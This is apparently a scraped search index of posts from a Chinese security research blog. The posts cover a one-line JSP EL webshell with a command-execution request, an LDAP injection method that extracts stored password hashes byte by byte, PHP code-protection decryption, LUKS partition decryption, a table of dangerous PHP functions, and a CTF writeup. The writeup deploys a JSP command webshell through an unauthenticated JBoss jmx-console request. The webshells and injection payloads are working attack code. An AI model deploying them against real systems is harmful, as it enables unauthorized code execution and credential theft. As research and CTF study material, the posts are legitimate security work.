8f2b46f54909c2d5c87a01dfc3fb987a0e5a628b97c246fab9431b013b4e96357256d2e7521f45d52ee91d3fb83106f825ad731e258ac407061b0b1375e125f5a2f5b342aac251203b01d29f8341e0b193cf0bf36111585332ee2f7164cdf5178b8ab5a4bf70dc54196aef745286a5ff88feeb519025d8145b6748ee658bcbbee8ceb4ec2b7279c8fd54156e2964c1cee66cc3e135b898544551e61bbe0e396cab60a3d104ac9840f9ba74fe9a15b4582f3953cfb74fcfe9d3a337f01f90d01a6c38a3d9f9bc9a044023c07ffd3bd23d7e3b8c7587b83239eb1ea1d2a1390a9e07878d610a49b540374f7dcd8bb0e6055b4c952c1a795724fddc3e36836982456874a2dce0a840961f386dbb66418b8002c45cd6ffdc5c0522063d427347e745b754eebb0d3b8ea0957c54cbd177fad1d5ffe50908f3177ba119ca70e32b652cdb9c213ca7a66143d6c0d373ca70c3cffb9477717d00c0e8f0187263b6c9314e8b51f668835344ce3289dc51a439018f4ca5eb006b4d71f97df8409eb97bccf67d8684c9a81d7eb9939b1baefb8f00314e28123dc31e3458600d1e697700a0fd366dfce68faf4ab9e500840849390c1b03900d93ad223c721022ebf2afb271b96242aae7c1f60071835932dd469f946fb58562cec04caf98da4f642637ce 密码是什么呢 ~☆","permalink":"https://rce.moe/2022/05/08/untitled-1652012374403/","photos":[]},{"tags":[],"title":"构建jsp webshell的一个小trick","date":"2022/04/18","text":"jsp中可以使用el表达式所以我们可以使用和el表达式注入一样的方法构造webshell 可以避免出现 &lt;%符号 ${Runtime.getRuntime().exec(param.a)} 无回显执行 没错就这么短 这才叫一句话嘛 ) ${''.getClass().forName(param.aef).newInstance().getEngineByName(\"javascript\").eval(param.aef1)} 使用js脚本引擎回显执行 POST /?aef=javax.script.ScriptEngineManager HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 373Connection: close aef1=try{load(“nashorn:mozilla_compat.js”);}catch (e){}importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[2];s[0]=’cmd’;s[1]=’/c whoami /all’;a=””;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output+=+new BufferedReader(new+InputStreamReader(b));while ((line=output.readLine()) != null) {a=a%2Bline%2B”\\n”};a","permalink":"https://rce.moe/2022/04/18/jsp-webshell-trick/","photos":[]},{"tags":[{"name":"password","slug":"password","permalink":"https://rce.moe/tags/password/"}],"title":"如何打造一个网络空间资产测绘系统--网络框架测绘の开发笔记","date":"2022/03/27","text":" 密码是什么呢 ~☆","permalink":"https://rce.moe/2022/03/27/wlch/","photos":[]},{"tags":[{"name":"password","slug":"password","permalink":"https://rce.moe/tags/password/"}],"title":"向日葵12の一个有趣的RCE","date":"2022/03/27","text":" 您好, 这里需要密码.","permalink":"https://rce.moe/2022/03/27/sunlogin12rce/","photos":[]},{"tags":[],"title":"记一次src测试中的ldap注入深入利用","date":"2022/01/25","text":"前言在最近的一次的src测试中遇到了ldap注入漏洞,目标是一个管理平台的单点登陆入口,漏洞存在于用户名存在判断处.之前渗透测试的时候我也遇到过几个生产环境中ldap注入的漏洞,但是都只能获取到有限的敏感信息(用户名 手机号 邮箱) 危害程度与ldap匿名绑定相同.在研究ldap查询语法时,我找到了一种可以外带ldap储存的用户密码的方法,实现了对ldap注入的进一步利用. ldap注入点判断ldap注入是指ldap过滤器语句(filter)的注入ldap过滤器的基本语法如下 =&gt;=&lt;=| 或&amp; 与! 非* 通配符(语句) 例如一个简单的查询语句如下 (cn=admin) 搜索cn值属性为admin的条目 成功会返回完整条目属性实际使用时可能会比较复杂比如说同时搜索匹配用户输入的用户名/邮箱/手机号 (|(cn=admin)(mail=admin)(mobile=admin)) ldap条目常见的属性值 cn (Common Name 通用名称) 常被用做用户名Surname 姓mobile 手机号mail 邮箱 在判断注入点的时候可以插入半个括号多余的未闭合的括号会使ldap查询出错 观察返回是否出现异常 即可判断注入点也可以直接输入*(星号) 通配符观察返回是否为用户存在但密码错误 或者是服务器错误(ldap查询可以同时返回多条结果 如果查询结果不唯一 后端未做好处理可能会报错)ldap注入常见于在判断用户名是否存在的点 很少出现在用户名密码同时判断的地方经过盲测发现目标可能的登陆逻辑如下 $ds=ldap_connect($ldapSrv,$port);//建立ldap连接if($ds) { $r=ldap_bind($ds, \"cn=\".$username.\",\".$dn, $passwd);/绑定ldap区域(相当于登陆ldap服务器) 使用域管用户登陆 检索用户列表 if($r) { $sr=ldap_search($ds, $dn, \"(user=\".$_GET[\"user\"].\")\");//在ldap中使用过滤器搜索用户名 $info = ldap_get_entries($ds, $sr); if($info[\"count\"]==0){ die('用户不存在'); } ldap_close($ds); $ds=ldap_connect($ldapSrv,$port);//建立ldap连接 $bd = ldap_bind($conn, $_GET[\"user\"], $passwd); // 绑定ldap区域(相当于登陆ldap服务器) 以普通用户登陆 判断是否登陆成功 if ($bd) { echo '登陆成功'; } else { echo '密码错误'; } ldap_close($ds); } else { echo \"Unable to connect to LDAP server.\"; } } ​ ldap的注入简单利用ldap通常构造通配符查询 控制返回的结果实现布尔注入从而带出ldap中储存的数据比如ldap中存在一个admin的用户名 查询的注入点为cn那么可以使用*匹配先猜测出用户名(cn=a*) 返回密码错误(cn=b*) 返回用户名不存在只要判断为密码错误即为匹配成功 构造脚本递归匹配字符(cn=a*)(cn=ad*)(cn=adm*)(cn=admi*)(cn=admin*)当然*也可以插在开头和中间或者是单独使用(cn=a*n)(cn=*n)(cn=*) 构造语句猜测admin用户的手机号(cn=admin)(mobile=13*)到这里已经可以跑出ldap中保存的一些敏感信息(手机号 邮箱 用户名)那么对ldap注入的利用只能到这了吗? 获取ldap中的密码作为用于用户认证鉴权场景的ldap服务,当然是要拿到ldap中储存的用户的密码查阅ldap文档 ldap的密码储存在userPassword属性尝试构造查询(cn=admin)(userPassword=a*)多次尝试发现都无法匹配记录.但是直接使用*可以匹配成功既然密码是一个属性为什么使用*号不能匹配部分字符串呢?经过查阅ldap rfc4519文档 发现userPassword属性类型不是常规的字符串,而是(Octet String 字节序列)*通配符只能匹配字符串那么怎么匹配字节序列呢通过阅读ldapwiki发现过滤器除了可以使用常规的运算符外,还有一种特殊的匹配规则(MatchingRule)其中有两个专门匹配Octet String的规则octetStringMatchoctetStringOrderingMatch第一个规则在完全匹配时才会返回真,这显然不能利用.在 rfc4517 找到了octetStringOrderingMatch规则的详细介绍 The rule evaluates to TRUE if and only if the attribute value appearsearlier in the collation order than the assertion value. The rulecompares octet strings from the first octet to the last octet, andfrom the most significant bit to the least significant bit within theoctet. The first occurrence of a different bit determines theordering of the strings. A zero bit precedes a one bit. If thestrings contain different numbers of octets but the longer string isidentical to the shorter string up to the length of the shorterstring, then the shorter string precedes the longer string. 逐字节比较两字节之间的大小 后者大于前者就返回真 显然这个规则可以用于注入使用 十六进制转义\\xx匹配单个字节 (ldap过滤器的语法之一) …. …. 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b) 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7c) 密码错误 第一个字节为7b 继续尝试 …. …. 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b\\4d) 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b\\4e) 密码错误 第二个字节为4d 继续尝试 …. ….注意要将匹配到的每个字节-1再进行下一个匹配最后直接转为字符串得到密码最后成功跑出了目标账号的密码 ldap密码格式新版本ldap的密码很少有明文储存 基本上都是哈希后的密码哈希格式为 {哈希类型}base64后的值ldap有四种常见哈希{SHA}(SHA1)(SSHA) 加盐 SHA1{MD5} MD5{SMD5} 加盐MD5带盐的hsah储存格式为 加盐hash值+盐值将base64解码出的hash部分转换为十六进制字符串就可以使用hashcat进行常规的hash猜测了 修复方法转义可能会改变ldap过滤器语法的字符LDAP注入与防御剖析 function ldapspecialchars($string) { $sanitized=array('\\\\' =&gt; '\\5c', '*' =&gt; '\\2a', '(' =&gt; '\\28', ')' =&gt; '\\29', \"\\x00\" =&gt; '\\00'); return str_replace(array_keys($sanitized),array_values($sanitized),$string);}","permalink":"https://rce.moe/2022/01/25/ldap-inject-1/","photos":[]},{"tags":[],"title":"浅谈PHP源代码保护方案&受保护PHP代码の解密还原","date":"2021/12/28","text":"前言php是一种解释型脚本语言.与编译型语言不同,php源代码不是直接翻译成机器语言.而是翻译成中间代码(OPCODE) ,再由解释器(ZEND引擎)对中间代码进行解释运行 .​ 在php源代码的保护在原理可以分为3大类. 源代码混淆(编码) OPCODE混淆(编码) 修改解释引擎(虚拟机) 在部署上可以分为2大类. 无扩展 有扩展 下面分析下各种加密方案的实现方法 PHP 加密方案分析无扩展方案源代码混淆无扩展的加密在一些小开发者比较常见。这种源代码保护方式侵入性小，无需对服务器做额外的配置，兼容性较强。​ 这种情况混淆后的源代码还原非常简单，可完全还原出源代码。 有时连注释都会保留 (x 我觉得这种混淆都不能称之为加密基本流程 压缩代码-&gt;混淆变量函数类名-&gt;使用简单函数和方法进行编码加密 例:base64 异或 手工解密看到这种的php不要慌 这种处理后的文件 解密流程的变量和函数名使用了大量的非打印字符 按照正常的流程就可以ctrl+alt+l 快捷键 格式化代码 (这里使用的PhpStorm 其他IDE 格式化遇到特殊符号可能出问题 这里提前调整好了文件编码)这里有一个php的特性 php中的base64遇到非base64表中字符会直接忽略 不会影响解码注: PHP7 遇到空字符可能会抛出error 可以使用php5.6执行 (这里有一个兼容性问题 )遇到这种加密最简单的方法就是找文件中最后一步执行的函数 直接把内容打印出来这种编码方法最后一步肯定要使用eval执行还原后的php代码 所以打印最后一个函数基本上php代码就会全部出来 (x 前面操作一大顿毫无卵用注: 有保护方案也使用了call_user_func或call_user_func_array间接调用eval成功还原源代码 自动化通用解密PHP提供了强大的扩展功能 可以直接通过编写php扩展hook eval相关函数 获取执行的源代码HOOK php zend引擎的 zend_compile_string zend_include_or_eval 函数达到目的这里演示的是 hook zend_compile_string 函数 /* $Id$ */#include \"php.h\"#include \"ext/standard/info.h\"static zend_op_array* (*old_compile_string)(zval *source_string, char *filename TSRMLS_DC);static zend_op_array* evalhook_compile_string(zval *source_string, char *filename TSRMLS_DC){ if(strstr(filename, \"eval()'d code\")) { printf(\"\\n------eval-------\\n%s\\n------eval-------\\n\",Z_STRVAL_P(source_string)); } return old_compile_string(source_string, filename TSRMLS_CC);}PHP_MINIT_FUNCTION(evalhook){ return SUCCESS;}PHP_MSHUTDOWN_FUNCTION(evalhook){ return SUCCESS;}PHP_RINIT_FUNCTION(evalhook){ old_compile_string = zend_compile_string; zend_compile_string = evalhook_compile_string; return SUCCESS;}PHP_RSHUTDOWN_FUNCTION(evalhook){ zend_compile_string = old_compile_string; return SUCCESS;}PHP_MINFO_FUNCTION(evalhook){ php_info_print_table_start(); php_info_print_table_row(2, \"eval hooking\", \"enabled\"); php_info_print_table_end();}zend_function_entry evalhook_functions[] = { ZEND_FE_END};zend_module_entry evalhook_module_entry = { STANDARD_MODULE_HEADER, \"evalhook\", evalhook_functions, PHP_MINIT(evalhook), PHP_MSHUTDOWN(evalhook), PHP_RINIT(evalhook), PHP_RSHUTDOWN(evalhook), PHP_MINFO(evalhook), \"0.0.1-dev\", STANDARD_MODULE_PROPERTIES};ZEND_GET_MODULE(evalhook) 成功还原源代码 PHP扩展方案源代码混淆使用php扩展的代码混淆和无扩展代码混淆比较相似，只不过是把代码还原过程从php代码转到了php扩展。同样是使用aes des 异或等加密方法直接加密php代码，HOOK翻译php的函数在翻译PHP文件前对文件进行解密操作。这种方案也可以完全还原出源代码。在无其他混淆和压缩时甚至还会保留注释。典型开源项目：php-beast tonyenc screw-plus​ 手工解密这里以beast为例.首先在php的扩展目录下找到beast.sobeast的加密方案会把加密key编译进扩展中. 我们只需要寻找key就可以完成解密beast由于是开源项目.有现成的符号表和源码这使得反编译寻找key变得非常简单.但这样有点太简单了. 所以这里演示的是在没有源码的情况下使用IDA分析解密流程.首先在导入表找到zend_compile_file这个函数会将php文件翻译成opcode因此大部分php加密扩展都需要hook这个函数达到拦截php文件载入和替换php文件的功能继续跟入发现有两个函数一般在这种php加密扩展设计时会对这个函数有两次操作：一个是在启动时hook 这个函数，一个是在停止时恢复这个函数。继续跟入启动hook显然文件处理逻辑在cgi_compile_file内跟踪文件句柄decrypt_file函数的参数存在文件句柄 所以这个函数应该就是文件解密函数根据代码可以看出beast 加密文件的结构| encrypt_file_header_sign 文件头标记（不固定 可修改）| reallen文件长度 int 4字节 | expire 到期时间 int 4字节| entype 加密方式 int 4字节| 加密后文件|分析文件头发现该文件加密方式为 02跟入beast_get_encrypt_algo2对应的是 aes_handler_ops使用了AES 128 ECB加密模式直接提取key参数内容长度刚好16位到这一步就成功拿到了加密秘钥使用拿到的KEY就可以解密PHP文件​ 自动化通用解密编写php扩展 HOOK zend_compile_file函数beast的加密不会对php文件做额外的操作 解密文件与加密前原文件完全一致php注释和原格式都会保留注意: 这里扩展加载顺序问题 建议直接修改php源码Zendzend_language_scanner.cZEND_API zend_op_array *compile_file opcodephp会将源代码翻译成类似汇编的二进制中间操作码再交给zend引擎执行。之前的介绍的都是编译之前对php源代码的直接操作。这里是对opcode的操作，跳过翻译过程，直接把现成的opcode交给zend引擎执行(不同版本PHP引擎编译出的opcode可能会有兼容性问题)。这种php代码防护方法 只能hook zend_execute 拿到opcode。 不可能直接得到原本的源码，只能通过反编译尽可能的还原源代码。大部分商业php保护方案都使用这种可靠的方案为基础 _ZendGuard(zend) _SourceGuardian(SG) IonCube (IC) Swoole Compiler上面的方案有的还对zend引擎进行了魔改，使翻译出的opcode只能在修改后的引擎执行,进一步增强了安全性。 还原代码hook zend_execute 拿到opcode使用对应版本的php操作码反推php代码太菜了不会反编译) 附录PHP扩展编译​ ​ docker run -it --rm -v /mnt/hgfs/tmpssd/php-eval-hook/:/ext/ php:5.6 /bin/bashapt-get update apt install libtool phpize phpize 生成Makefile ./configure --enable-evalhook 配置编译选项 启用扩展​ 最后执行make 编译扩展编译好的扩展会放在./modules/ 目录下使用扩展 php -d extension=扩展位置 -f 文件 可以重复使用-d extension 加载多个扩展 ​ 总结在选用PHP源码保护方案时 尽量选择opcode或虚拟机方案源代码混淆类只能对源代码获取和阅读增加一点困难 在加密扩展可被攻击者获取到时并不能起到保护作用PHP代码审计入门指南 参考 php内核剖析​从Zend虚拟机分析PHP加密扩展通用加密php文件还原方法","permalink":"https://rce.moe/2021/12/28/phpydmbh/","photos":[]},{"tags":[],"title":"记一次审计时遇到的加密分区解密","date":"2021/12/28","text":"前言​ 最近拿到了一个商业产品的qcow2 镜像 准备试一试代码审计首先用qemu-img 转换成vmdk 镜像 qemu-img convert -f qcow2 123.qcow2 vmdk 123.vmdk 转换遇到错误 网上搜索只有一个其他项目的issue 没有解决方案阅读qemu源代码 发现是在2017-02-15版本引入了这个特性https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg03173.html bitmaps_ext: Invalid extension length: Unknown error 发现可以使用2016年的旧版qemu完成转换https://qemu.weilnetz.de/w64/2016/转换完成使用vm启动 准备进入grub修改root密码发现grub使用密码验证​ 准备使用diskgenius载入镜像删除grub密码载入镜像后如下图所示除引导分区外 其他分区的文件系统不能正常识别​ 文件系统分析ci 是一个 LINUX LVM的卷组通过前缀魔数判断root卷文件系统为 XFSdiskgenius 不支持XFS文件系统 所以只能使用其他方法挂载读写里面的内容继续看其他分区 发现app home 分区与其他分区文件系统不一样有着LUKS的标记经过搜索发现这是一种LINUX上的硬盘加密方案 Linux Unified Key Setup使用了AES加密 需要秘钥才能解密既然可以正常进入系统,那就说明秘钥是储存在本地的.我们只要寻找系统分区的挂载配置就有可能找到秘钥. 文件系统解密准备一台可以正常使用的linux虚拟机. 这里使用了一台 kali将要挂载的硬盘添加到虚拟机中首先挂载 LINUX LVM卷组vgscan 扫描卷组vgchange -ay 卷标签 (激活卷组)成功挂载卷因为root分区没有加密所以直接挂载他新建一个目录 挂载root分区mount -t xfs /dev/mapper/cl-root /tmp/temfs/成功挂载root分区现在可以直接对root分区进行读写操作了 可以修改密码直接进入系统读取解密后分区的文件但是不能止步于此 既然遇到了这种特殊情况 就要学习下解密luks分区在查了一些资料后 发现解密方法非常简单第一步先在root分区寻找分区挂载的配置文件 /etc/fstab 启动分区挂载/etc/crypttab 分区解密 可以在/etc/crypttab 文件中找到用于分区解密的key文件位置 安装luks命令工具使用命令行解密分区 cryptsetup luksOpen 被加密的分区 --key-file 秘钥文件cryptsetup luksOpen /dev/mapper/cl-app --key-file /tmp/temfs/etc/.appconf/.abcde app 成功解密分区将这个mapper挂载到一个目录mkdir /tmp/atrustapp/mount -t xfs /dev/mapper/app /tmp/atrustapp/到这一步就完成了解密其他分区可按照这种方法使用对应秘钥单独解密","permalink":"https://rce.moe/2021/12/28/jycjmfqjm/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"《PHP代码审计入门指南》","date":"2021/12/02","text":"这本指南包含了我在学习PHP代码审计过程中整理出的一些技巧和对漏洞的一些理解 https://github.com/burpheart/PHPAuditGuideBook https://cz0.gitbook.io/phpauditguidebook/","permalink":"https://rce.moe/2021/12/02/shenjizhinan/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"}],"title":"PHP代码审计入门基础-PHP敏感函数速查表","date":"2021/10/27","text":"PHP敏感函数速查表最近正在写一篇PHP代码审计的入门指南文档. 如果表格内出现遗漏或错误,欢迎大家私信反馈. PHP一些容易出现安全问题的函数方法命令执行一些常见的可以执行系统命令的函数/语法 函数/语法 描述 例子 system 执行命令并输出结果 system(‘id’); exec 执行命令 只可获取最后一行结果 exec(‘id’,$a); print_r($a); passthru 同 system passthru(‘id’); shell_exec ` (反引号) 执行命令并返回结果 $a=shell_exec(‘id’);print_r($a); $a=`id`;print_r($a); popen 执行命令并建立管道 返回一个指针 使用fread等函数操作指针进行读写 $a=popen(“id”, “r”); echo fread($a, 2096); proc_open 同 popen (进程控制功能更强大) 见PHP手册 pcntl_exec 执行命令 只返回是否发生错误 pcntl_exec(‘id’); 代码注入/文件包含 函数/语法结构 描述 例子 eval 将传入的参数内容作为PHP代码执行 eval 不是函数 是一种语法结构 不能当做函数动态调用 eval(‘phpinfo();’); assert 将传入的参数内容作为PHP代码执行 版本在PHP7以下是函数 PHP7及以上为语法结构 assert(‘phpinfo();’); preg_replace 当preg_replace使用/e修饰符且原字符串可控时时 有可能执行php代码 echo preg_replace(“/e”,”{${PHPINFO()}}”,”123”); call_user_func 把第一个参数作为回调函数调用 需要两个参数都完全可控才可利用 只能传入一个参数调用 call_user_func(‘assert’, ‘phpinfo();’); call_user_func_array 同call_user_func 可传入一个数组带入多个参数调用函数 call_user_func_array (‘file_put_contents’, [‘1.txt’,’6666’]); create_function 根据传递的参数创建匿名函数，并为其返回唯一名称 利用需要第二个参数可控 且创建的函数被执行 $f = create_function(‘’,’system($_GET[123]);’); $f(); include 包含并运行指定文件 执行出错会抛出错误 include ‘vars.php’; (括号可有可无) require 同include 执行出错会抛出警告 require(‘somefile.php’); (括号可有可无) require_once 同require 但会检查之前是否已经包含该文件 确保不重复包含 include_once 同include 但会检查之前是否已经包含该文件 确保不重复包含 SQL/LDAP注入 函数/方法 备注 mysql_query odbc_exec mysqli_query mysql_db_query mysql_unbuffered_query mysqli::query用法$mysqli = new mysqli(“localhost”, “my_user”, “my_password”, “world”);$mysqli-&gt;query(); pg_query pg_query_params pg_send_query pg_send_query_params sqlsrv_query pdo::query$pdo=new PDO(“mysql:host=localhost;dbname=phpdemo”,”root”,”1234”); $pdo-&gt;query($sql);; PDO SQLite3::querySQLite3::exec$db = new SQLite3(‘mysqlitedb.db’); $db-&gt;query(‘SELECT bar FROM foo’); $db-&gt;exec(‘CREATE TABLE bar (bar STRING)’); $mongo = new mongoclient(); $data = $coll-&gt;find($data); https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html $ld = ldap_connect(“localhost”);…. $lb = @ldap_bind($ld, “cn=test,dc=test,dc=com”, “test”); https://www.cnblogs.com/0nc3/p/12063436.html Db::query Thinkphp Db::execute Thinkphp 文件读取/SSRF 函数 描述 例子 file_get_contents 读入文件返回字符串 echo file_get_contents(“flag.txt”); echo file_get_contents(“https://www.bilibili.com/\"); curl_setopt curl_exec Curl访问url获取信息 function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); } $url = $_GET[‘url’]; curl($url); https://www.php.net/manual/zh/function.curl-exec.php fsockopen 打开一个套接字连接(远程 tcp/udp raw) https://www.php.net/manual/zh/function.fsockopen.php readfile 读取一个文件，并写入到输出缓冲 同file_get_contents fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf 打开文件或者 URL 读取文件流 $file = fopen(“test.txt”,”r”); echo fread($file,”1234”); fclose($file); file 把整个文件读入一个数组中 echo implode(‘’, file(‘https://www.bilibili.com/')); highlight_file/show_source 语法高亮一个文件 highlight_file(“1.php”); parse_ini_file 读取并解析一个ini配置文件 print_r(parse_ini_file(‘1.ini’)); simplexml_load_file 读取文件作为XML文档解析 文件上传/写入/其他 函数 描述 例子 file_put_contents 将一个字符串写入文件 file_put_contents(“1.txt”,”6666”); move_uploaded_file 将上传的临时文件移动到新的位置 move_uploaded_file($_FILES[“pictures”][“tmp_name”],”1.php”) rename 重命名文件/目录 rename($oldname, $newname); rmdir 删除目录 mkdir 创建目录 unlink 删除文件 copy 复制文件 copy($file, $newfile); fopen/fputs/fwrite 打开文件或者 URL https://www.php.net/manual/zh/function.fwrite.php link 创建文件硬链接 link($target, $link); symlink 创建符号链接(软链接) symlink($target, $link); tmpfile 创建一个临时文件 (在临时目录存放 随机文件名 返回句柄) $temp = tmpfile(); fwrite($temp, “123456”); fclose($temp); request()-&gt;file()-&gt;move()request()-&gt;file()-&gt;file() Thinkphp 文件上传 $file = request()-&gt;file($name);$file-&gt;move($filepath); extractTo 解压ZIP到目录 DOMDocument loadXML simplexml_import_dom 加载解析XML 有可能存在XXEE 漏洞 file_get_contents获取客户端输入内容 new DOMDocument()初始化XML解析器 loadXML($xmlfile)加载客户端输入的XML内容 simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。 &lt;?php $xmlfile=file_get_contents(‘php://input’); $dom=new DOMDocument(); $dom-&gt;loadXML($xmlfile); $xml=simplexml_import_dom($dom); $xxe=$xml-&gt;xxe; $str=”$xxe \\n”; echo $str; ?&gt; 来自 &lt;_https://xz.aliyun.com/t/6887_&gt; simplexml_load_string 加载解析XML字符串 有可能存在XXE 漏洞 $xml=simplexml_load_string($_REQUEST[‘xml’]); print_r($xml); simplexml_load_file 读取文件作为XML文档解析 有可能存在XXE 漏洞 unserialize 反序列化","permalink":"https://rce.moe/2021/10/27/PHPsuchabiao/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}],"title":"第五届强网杯全国网络安全挑战赛WEB-部分writeup-强网杯2021","date":"2021/06/14","text":"EASYWEB 控制台查看网络请求发现flies 访问47.104.137.239/files/c09358adff2ebfff2ef9b4fbacc4ac0b 下载hint.txt 拿到提示 Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee 根据提示通过端口扫描发现36842端口开放username存在sql注入 POST /account/login HTTP/1.1Host: 47.104.137.239:36842User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 35DNT: 1Connection: closeReferer: http://121.42.242.238:36842/account/loginCookie: ci_session=bo397pc9n0pd318uetdbl1r5rh33u3jbUpgrade-Insecure-Requests: 1username=admin*&amp;password=admin 拿到登陆账号密码admin 99f609527226e076d668668582ac4420登陆后台后台没有可以利用的地方 继续扫描目录 发现文件上传路由构造文件名绕过限制上传php文件 由于权限太低无法getflag (只有owner有权限 flag权限应该是0440) 需要root用户组继续查看监听端口发现有其他服务 通过上传的小马写入新的phpshell通过shell搭建隧道 访问web服务 发现是一个存在jmx-console未授权访问的jboss /jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell1&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%25 if(\"023\".equals(request.getParameter(\"pwd\"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"&lt;pre&gt;\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"&lt;/pre&gt;\");}%25&gt;&amp;argType=boolean&amp;arg4=True 写入一句话shell 成功getflag pop_master该题需要构造反序列化利用链 最终实现RCE由于该题目类数量巨大1W个 编写自动化脚本构造pop链 第一步将class.php.txt转化成AST(抽象语法树) 保存为json格式&lt;?phpini_set(“memory_limit”,”-1”);echo(json_encode(ast\\parse_file(“class.php”, $version=70)));构造比较简单A-&gt;B-&gt;C-&gt;…….-&gt;包含EVAL()的class function调用这里有几个坑 1.调用途中有参数污染(附加垃圾数据) 2.调用途中传参可能被清空 (传参被赋值未定义的变量)3.调用途中传参可能被修改 (直接赋值为垃圾数据)所以并不是找到调用链就可以完成工作 而是需要找到可以利用的调用链 自动化代码:PS:没有什么参考价值 只对该题可用 因为固定3种函数结构所以偷懒把参数写死了 初学py语言 第一次做AST树解析用这种笨方法) ## -*- coding: utf-8 -*-import jsonimport randomimport osimport stringwith open(\"12.json\") as f: line=f.readline() result=json.loads(line)print(len(result['children']))def asb(name,s,s1=''): ee = 0 for a in result['children']: for b in a['children']['stmts']['children']: if 'name' in b['children'].keys(): if (b['children']['name'] == 'gG1T5D'): ee = 0 #ee=1 if (b['children']['name'] == name): test(a) if(len(b['children']['stmts']['children'])==3): q = b['children']['stmts']['children'][1]['children'][0]['children']['cond']['children']['args']['children'][1] w = b['children']['stmts']['children'][random.randint(1,2)]['children'][0]['children']['cond']['children']['args']['children'][1]#随机分支 玄学构造 #print(s + q) #print(s + w) ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$'+ran_str+'=new '+a['children']['name']+'();') s11='$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #if s1!='': # asb(w, s +w+'--&gt;') # asb(q, s +q+'--&gt;') if ee!=1: asb(w,s,s11)# 分支函数1 #asb(q, s, s11)# 分支函数2 if ran_str == '': exit() print(s1 + '$' + ran_str+';') #asb(q, s +q+'--&gt;') else: if 'method' in b['children']['stmts']['children'][1]['children'].keys():# 没有分支 q = b['children']['stmts']['children'][1]['children']['method'] ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$' + ran_str + '=new ' + a['children']['name'] + '();') s11 = '$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #print(s + q) if ee != 1: asb(q, s, s11) if ran_str == '': exit() print(s1 + '$' + ran_str + ';')def test(d): #if name in {'Name','COiLxB'}: #print('nono') #exit() try: a=d['children']['stmts']['children'][1]['children']['params']['children'][0]['children']['name'] b=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['var']['children']['name'] c=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['expr']['children']['name'] if(a==b and b!=c and a!='DgiNa'): #判断赋值是否是用不存在的变量覆盖传参 print(a,b,c) print('no') asb('YYdqkf', 'YYdqkf' + '--&gt;')#重新搜索 os._exit(0) except: passasb('YYdqkf','YYdqkf'+'--&gt;') 编写脚本处理AST随机抽取一条构造链 检验是否正常执行(传参修改检测) 反复抽取得到可用的链ps:例图输出与下面代码无关 找不到成功的图了 &lt;?php此处省略3M大小的源class$a=new WK4tcG();$prXsQMfO=new WK4tcG();$DLcTtAga=new xaeGnG();$lcbgRpGI=new oAMzcx();$IatldcbW=new p38LCI();$nULgbaKw=new GbfW4c();$ASyQaYMV=new m2s3zO();$GMwztlCS=new PgSSqR();$MegPsOnX=new RLuIRL();$neJOwgfu=new WykBAC();$PNHChDce=new g6hgDh();$BzceWjKp=new HDaeRV();$YThMXwcb=new bREm3w();$xWVjhwmO=new D0aZh5();$BIbCvgZD=new T9NX4U();$prvhXPMW=new eWciOL();$NVHbgdzD=new TqWDlm();$mszgihWC=new XoFA87();$vDBkPwqO=new MU1ai5();$ZYHhsIid=new eHtdBF();$ZYHhsIid-&gt;V7XKdgi=new 